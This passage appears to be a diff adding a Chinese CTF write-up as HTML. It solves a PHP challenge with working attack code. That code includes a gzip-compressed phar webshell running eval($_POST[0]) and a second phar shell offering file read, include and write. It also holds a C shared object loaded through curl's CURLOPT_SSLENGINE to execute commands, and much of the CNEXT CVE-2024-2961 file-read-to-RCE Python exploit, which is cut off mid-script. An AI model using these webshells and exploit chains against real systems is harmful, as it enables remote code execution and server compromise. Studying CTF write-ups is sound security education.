class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>file_put_contents和include或许有利用价值</p>
+<p>先用file_put_contents下马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;payload.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<br>    <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string"> eval($_POST[0]);</span><br><span class="hljs-string"> __HALT_COMPILER();</span><br><span class="hljs-string"> ?&gt;</span><br><span class="hljs-string">&#x27;</span><br>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;suny&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>
+
+<p>由于上传过滤了halt，用gzip压缩一下</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">gzip -c payload.phar &gt; <span class="hljs-built_in">shell</span>.phar<br></code></pre></td></tr></table></figure>
+
+<p>成功读到了index.php缺失的部分</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-comment">// I hide a trick to bypass open_basedir, I&#x27;m sure you can find it.</span><br>curl_setopt(<span class="hljs-built_in">$ch</span>, CURLOPT_PROTOCOLS_STR, <span class="hljs-string">&quot;all&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>看一眼php版本是8.3，所以要用curl绕过open_basedir</p>
+<p>下一步就是执行&#x2F;readflag，有两个思路</p>
+<h3 id="curl加载so"><a href="#curl加载so" class="headerlink" title="curl加载so"></a>curl加载so</h3><p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/11/01/%E6%9C%80%E6%96%B0%E7%89%88-php-%E7%BB%95-open_basedir-%E5%92%8C-disable_functions/">最新版 PHP 绕 open_basedir 和 disable_functions – fushulingのblog</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>__attribute__((constructor))<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">rce_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag &gt; /tmp/1.txt&quot;</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在linux下打包so</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">g++ -fPIC -<span class="hljs-keyword">shared</span> -o evil.so <span class="hljs-number">1.</span>cpp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$ch</span> = curl_init();</span><br>curl_setopt(<span class="hljs-symbol">$</span>ch, CURLOPT_SSLENGINE,<span class="hljs-string">&quot;/tmp/evil.so&quot;</span>);<br><span class="hljs-meta"><span class="hljs-keyword">$data</span> = curl_exec($ch);</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260301133121019.png" srcset="/img/loading.gif" lazyload alt="image-20260301133121019"></p>
+<h3 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h3><p>file_get_contents被ban了，include也没有开启allow_url_include</p>
+<p>但是我们现在是有 file_put_contents 在限制的目录下写内容, 我们可以将这需要通过 filter chain 的内容写到一个文件中, 然后再讲原始 filter chain 的来源指向这个文件, 同样也能触发</p>
+<p>读取&#x2F;proc&#x2F;self&#x2F;maps并找到libc地址</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260301134959577.png" srcset="/img/loading.gif" lazyload alt="image-20260301134959577"></p>
+<p>libc.so.6是二进制文件可以用bp保存到文件注意删掉响应头，不要留空行</p>
+<p>这里用kezibei师傅跑了十几遍（map和libc没有问题）都报错，真没招了</p>
+<p>cn-ext那个我不太会改，这里从网上抄了一个脚本，可以跑出来</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exp.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php </span><br><span class="hljs-string">if (isset($_POST[&quot;download&quot;])) &#123;</span><br><span class="hljs-string">    $ch = curl_init(&quot;file://&quot;. $_POST[&quot;download&quot;]);</span><br><span class="hljs-string">    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;);</span><br><span class="hljs-string">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="hljs-string">    $data = curl_exec($ch);</span><br><span class="hljs-string">    curl_close($ch);</span><br><span class="hljs-string">    echo $data;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">if (isset($_POST[&quot;include&quot;])) &#123;</span><br><span class="hljs-string">    include $_POST[&quot;include&quot;];</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">if (isset($_POST[&quot;content&quot;]) &amp;&amp; isset($_POST[&quot;path&quot;])) &#123;</span><br><span class="hljs-string">    $content = $_POST[&quot;content&quot;];</span><br><span class="hljs-string">    if ($_POST[&quot;base64&quot;]) &#123;</span><br><span class="hljs-string">    	$content = base64_decode($content);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    file_put_contents($_POST[&quot;path&quot;], $_POST[&quot;content&quot;]);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">__HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;nothing&#x27;</span>,<span class="hljs-string">&#x27;OK&#x27;</span>);<br><br><br><span class="hljs-variable">$gz</span> = <span class="hljs-title function_ invoke__">gzopen</span>(<span class="hljs-string">&quot;exp.phar.gz&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>);<br><span class="hljs-title function_ invoke__">gzwrite</span>(<span class="hljs-variable">$gz</span>, <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;exp.phar&#x27;</span>));<br><span class="hljs-title function_ invoke__">gzclose</span>(<span class="hljs-variable">$gz</span>);<br></code></pre></td></tr></table></figure>
+
+<p>cn-ext:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ConnectionError, ChunkedEncodingError<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;include&quot;</span>: path&#125;)<br>    <br>    <span class="hljs-comment"># --------</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;path&quot;</span>: path, <span class="hljs-string">&quot;content&quot;</span>: content&#125;)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">iconv</span>(<span class="hljs-params">self, filters: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>, content: <span class="hljs-built_in">str</span> | <span class="hljs-built_in">bytes</span></span>) -&gt; Response:<br>        filename = <span class="hljs-string">&quot;&quot;</span>.join(random.choices(string.ascii_letters, k=<span class="hljs-number">6</span>))<br>        path = <span class="hljs-string">f&quot;/tmp/<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>        <span class="hljs-variable language_">self</span>.upload(path, content)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">f&quot;php://filter<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># --------</span><br><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span><br>        <span class="hljs-comment"># response = self.send(path)</span><br>        <span class="hljs-comment"># data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)</span><br>        <span class="hljs-comment"># return base64.decode(data)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;download&quot;</span>: path&#125;).content<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span 